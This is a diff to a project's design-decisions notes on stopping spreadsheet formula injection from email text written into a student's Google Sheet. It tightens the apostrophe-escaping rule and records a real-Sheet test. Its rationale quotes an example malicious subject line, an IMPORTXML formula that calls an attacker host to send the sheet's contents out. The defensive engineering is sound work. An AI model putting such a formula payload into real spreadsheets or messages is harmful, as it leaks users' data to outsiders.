@@ -136,10 +136,17 @@ none land in those two columns.
 
 ## 10. Email text can never become a formula
 
-**Decided:** every tool-written cell is formatted as plain text, and any
-value starting with `=`, `+`, `-` or `@` gets a leading apostrophe. Links
-are written as rich-text links, never as `=HYPERLINK()` formulas, and only
-after the address passes an http(s) check. Dates are written as text.
+**Decided:** any value starting with `=`, `+`, `-`, `@` or an apostrophe
+gets a leading apostrophe, and every tool-written cell is also formatted as
+plain text. Links are written as rich-text links, never as `=HYPERLINK()`
+formulas, and only after the address passes an http(s) check. Dates are
+written as text.
+
+**Checked on a real Sheet:** plain-text formatting on its own does *not*
+stop a script from writing a formula (`=1+1` still evaluated to 2). The
+apostrophe is what protects; the formatting only keeps dates and numbers
+from being re-interpreted. A value read back from a cell has lost its
+apostrophe, so everything is escaped again whenever a row is rewritten.
 
 **Why:** a subject line such as `=IMPORTXML("https://attacker/?"&A1, ...)`
 would otherwise run inside the student's Sheet and could send its contents
